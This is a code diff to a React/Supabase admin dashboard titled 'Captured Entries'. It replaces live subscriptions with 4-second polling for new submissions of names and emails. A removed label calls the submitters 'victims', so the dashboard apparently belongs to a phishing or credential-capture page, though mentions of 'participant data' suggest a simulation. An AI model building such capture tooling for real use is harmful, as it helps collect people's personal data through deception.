@@ -63,23 +63,49 @@ export default function Admin() {
   const [confirmAll, setConfirmAll] = useState(false)
   const [tab, setTab] = useState('entries')
   const [newAlert, setNewAlert] = useState(null)
-  const prevCount = useRef(0)
+  const latestIdRef = useRef(null)
+  const initialLoadDone = useRef(false)
 
+  // Initial load
   useEffect(() => {
     if (!authed) return
     loadEntries()
+  }, [authed])
 
-    const channel = supabase
-      .channel('entries-live')
-      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'entries' }, payload => {
-        const entry = payload.new
-        setEntries(prev => [entry, ...prev])
-        setNewAlert(entry)
-        addLog(`NEW ENTRY: ${entry.firstname} ${entry.lastname} — ${entry.email}`)
-      })
-      .subscribe()
+  // Poll every 4 seconds for new entries
+  useEffect(() => {
+    if (!authed) return
+    const interval = setInterval(async () => {
+      const { data, error } = await supabase
+        .from('entries')
+        .select('*')
+        .order('created_at', { ascending: false })
+      if (error || !data) return
 
-    return () => supabase.removeChannel(channel)
+      setEntries(data)
+
+      // Only alert on new entries after first load is done
+      if (!initialLoadDone.current) {
+        if (data.length > 0) latestIdRef.current = data[0].id
+        initialLoadDone.current = true
+        return
+      }
+
+      // Check if there's a new entry we haven't seen
+      if (data.length > 0 && data[0].id !== latestIdRef.current) {
+        const newEntries = data.filter(e =>
+          latestIdRef.current === null || e.id > latestIdRef.current
+        )
+        if (newEntries.length > 0) {
+          const newest = newEntries[0]
+          latestIdRef.current = data[0].id
+          setNewAlert(newest)
+          addLog(`NEW ENTRY: ${newest.firstname} ${newest.lastname} — ${newest.email}`)
+        }
+      }
+    }, 4000)
+
+    return () => clearInterval(interval)
   }, [authed])
 
   async function loadEntries() {
@@ -88,7 +114,11 @@ export default function Admin() {
       .from('entries')
       .select('*')
       .order('created_at', { ascending: false })
-    if (!error) setEntries(data || [])
+    if (!error && data) {
+      setEntries(data)
+      if (data.length > 0) latestIdRef.current = data[0].id
+      initialLoadDone.current = true
+    }
     setLoading(false)
   }
 
@@ -103,6 +133,7 @@ export default function Admin() {
     await supabase.from('entries').delete().neq('id', 0)
     setEntries([])
     setConfirmAll(false)
+    latestIdRef.current = null
     addLog(`All ${count} entries permanently deleted from database.`)
     addLog(`Decommissioning complete. No participant data remains in storage.`)
   }
@@ -230,7 +261,7 @@ export default function Admin() {
             <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 mb-6">
               <div>
                 <h1 className="text-xl font-bold">Captured <span className="text-[#00e5ff]">Entries</span></h1>
-                <p className="text-slate-500 text-xs mt-0.5">Live — updates instantly when victims submit</p>
+                <p className="text-slate-500 text-xs mt-0.5">Auto-refreshes every 4 seconds</p>
               </div>
               <button onClick={loadEntries}
                 className="px-3 py-2 text-xs font-semibold bg-[#00e5ff] text-[#0d0f14] rounded-lg hover:opacity-90 transition self-start sm:self-auto">
